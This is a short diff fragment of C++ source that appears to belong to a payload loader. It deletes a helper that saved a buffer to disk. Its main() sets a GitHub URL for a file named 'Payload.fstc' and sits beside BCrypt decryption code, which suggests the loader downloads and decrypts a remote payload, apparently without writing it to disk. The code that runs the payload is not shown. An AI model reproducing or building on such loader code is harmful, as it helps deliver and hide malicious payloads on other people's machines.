@@ -127,17 +127,6 @@ Cleanup:
     return BCRYPT_SUCCESS(status);
 }
 
-BOOL SaveToFile(LPCSTR filePath, PBYTE pData, DWORD dataSize) {
-    std::ofstream outFile(filePath, std::ios::binary);
-    if (!outFile) {
-        std::cerr << "[!] Failed to open file for writing: " << filePath << std::endl;
-        return FALSE;
-    }
-    outFile.write(reinterpret_cast<const char*>(pData), dataSize);
-    outFile.close();
-    return TRUE;
-}
-
 int main() {
     LPCWSTR url = L"https://github.com/LNodesL/FSTC-August-2024/raw/d2b6ad4fda92b3df62b99243c8591446ca46446e/files/Payload.fstc";
     PBYTE pPayload = NULL;
